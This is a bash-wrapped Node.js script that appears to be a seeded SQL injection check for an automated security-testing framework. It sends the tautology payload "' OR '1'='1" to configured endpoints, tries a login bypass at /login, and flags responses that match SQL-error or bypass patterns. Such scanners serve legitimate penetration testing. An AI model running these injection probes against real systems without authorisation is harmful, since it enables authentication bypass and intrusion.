#!/usr/bin/env bash
set -euo pipefail
payload="$(cat)"
SEED_PAYLOAD="$payload" node <<'NODE'
const http = require("node:http");
const https = require("node:https");
const { URLSearchParams } = require("node:url");

const payload = JSON.parse(process.env.SEED_PAYLOAD || "{}");
const toolInput = payload?.request?.parameters?.toolInput ?? {};
const explicitEndpoint = [toolInput.url, toolInput.loginUrl, toolInput.startUrl]
  .find((value) => typeof value === "string" && value.trim().length > 0);
const baseUrl = String(toolInput.baseUrl || explicitEndpoint || `http://${toolInput.target || payload?.request?.target || "localhost"}`);
const defaultUrl = new URL("/login", baseUrl).toString();
const parameterNames = (Array.isArray(toolInput.candidateParameters) && toolInput.candidateParameters.length > 0
  ? toolInput.candidateParameters
  : Array.isArray(toolInput.parameters) && toolInput.parameters.length > 0
    ? toolInput.parameters
    : ["q"]).filter((value) => typeof value === "string" && value.trim().length > 0).map((value) => value.trim());
const injectionPayload = "' OR '1'='1";
const maxRequests = Number.isFinite(Number(toolInput.maxRequests)) ? Math.max(1, Number(toolInput.maxRequests)) : 24;

function normalizeTargetUrl(target) {
  if (!target || typeof target !== "object") {
    return null;
  }
  const raw = target.url || target.endpoint || target.path;
  if (typeof raw !== "string" || raw.trim().length === 0) {
    return null;
  }
  const url = new URL(raw, baseUrl);
  for (const [key, value] of Object.entries(target.query || {})) {
    url.searchParams.set(key, String(value));
  }
  return url.toString();
}

function buildRequests() {
  const requests = [];
  if (Array.isArray(toolInput.validationTargets) && toolInput.validationTargets.length > 0) {
    for (const target of toolInput.validationTargets) {
      const url = normalizeTargetUrl(target);
      if (!url) {
        continue;
      }
      const method = String(target.method || toolInput.method || "GET").toUpperCase();
      const body = target.body && typeof target.body === "object" ? { ...target.body } : {};
      const query = target.query && typeof target.query === "object" ? { ...target.query } : {};
      const params = Object.keys(method === "POST" ? body : query);
      const candidateParams = params.length > 0 ? params : parameterNames;
      for (const parameter of candidateParams) {
        requests.push({ url, method, parameter, body, query, headers: target.headers || {}, label: target.label || target.notes || "" });
      }
    }
    return requests.slice(0, maxRequests);
  }

  const endpointSource = Array.isArray(toolInput.candidateEndpoints) && toolInput.candidateEndpoints.length > 0
    ? toolInput.candidateEndpoints
    : [explicitEndpoint || defaultUrl];
  for (const endpoint of endpointSource) {
    const url = new URL(String(endpoint), baseUrl).toString();
    const method = String(toolInput.method || (new URL(url).pathname === "/login" ? "POST" : "GET")).toUpperCase();
    if (method === "POST" && new URL(url).pathname === "/login") {
      requests.push({ url, method, parameter: "username", body: { username: injectionPayload, password: "test" }, query: {}, headers: {}, label: "legacy login fallback" });
      continue;
    }
    for (const parameter of parameterNames) {
      requests.push({ url, method, parameter, body: {}, query: {}, headers: {}, label: "" });
    }
  }
  return requests.slice(0, maxRequests);
}

function submit(requestUrl, requestMethod, values, headers = {}) {
  return new Promise((resolve) => {
    const url = new URL(requestUrl);
    const transport = url.protocol === "https:" ? https : http;
    const body = new URLSearchParams(values).toString();
    if (requestMethod === "GET") {
      for (const [key, value] of Object.entries(values)) {
        url.searchParams.set(key, value);
      }
    }
    const req = transport.request(url, {
      method: requestMethod,
      timeout: 2000,
      headers: requestMethod === "POST" ? {
        ...headers,
        'content-type': 'application/x-www-form-urlencoded',
        'content-length': Buffer.byteLength(body)
      } : headers
    }, (res) => {
      let responseBody = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { if (responseBody.length < 16384) { responseBody += chunk; } });
      res.on("end", () => resolve({ url: url.toString(), statusCode: res.statusCode ?? 0, body: responseBody }));
    });
    req.on("timeout", () => req.destroy(new Error("request timed out")));
    req.on("error", (error) => resolve({ url: url.toString(), statusCode: 0, body: error.message, error: error.message }));
    if (requestMethod === "POST") {
      req.write(body);
    }
    req.end();
  });
}

(async () => {
  const requests = buildRequests();
  const observations = [];
  let firstFailure = null;
  for (const requestSpec of requests) {
    const submission = requestSpec.method === "POST"
      ? { ...requestSpec.body, [requestSpec.parameter]: injectionPayload }
      : { ...requestSpec.query, [requestSpec.parameter]: injectionPayload };
    const result = await submit(requestSpec.url, requestSpec.method, submission, requestSpec.headers);
    if (result.statusCode === 0) {
      firstFailure = { requestSpec, result };
      break;
    }
    const indicators = [/Authentication bypassed via SQL injection/i, /"success"\s*:\s*true/i, /SELECT \* FROM users/i, /"user"\s*:\s*\{/i, /database error/i, /sql syntax/i, /near SELECT/i];
    const matched = indicators.filter((indicator) => indicator.test(result.body));
    if (matched.length > 0) {
      const path = `${new URL(result.url).pathname}${new URL(result.url).search}`;
      observations.push({
        key: `sqli:${path}`,
        title: `${path} appears injectable with a classic quote payload`,
        summary: `${path} returned a concrete SQL injection signal for parameter ${requestSpec.parameter}; this is validation evidence, not merely endpoint reachability.`,
        severity: "high",
        confidence: 0.97,
        evidence: `Request target: ${result.url}\nMethod: ${requestSpec.method}\nStatus: ${result.statusCode}\nParameter: ${requestSpec.parameter}\nPayload: ${JSON.stringify(submission)}\nSignal: ${matched.map(String).join(", ")}\nProof: ${result.body.slice(0, 320)}`,
        technique: "seeded SQL injection check"
      });
    }
  }
  if (firstFailure) {
    console.log(JSON.stringify({
      output: `SQL injection check could not reach ${firstFailure.requestSpec.url}: ${firstFailure.result.body}`,
      statusReason: "Target endpoint was unreachable during SQL injection check"
    }));
    process.exit(64);
  }
  const output = observations.length > 0
    ? `HIGH ${observations[0].title}`
    : `No SQL injection signal was confirmed across ${requests.length} request(s).`;
  console.log(JSON.stringify({
    output,
    observations,
    commandPreview: `seed-sql-injection-check requests=${requests.map((item) => `${item.method}:${item.url}:${item.parameter}`).join(",")}`
  }));
})().catch((error) => {
  console.log(JSON.stringify({
    output: `SQL injection check failed: ${error.message}`,
    statusReason: error.message
  }));
  process.exit(1);
});
NODE
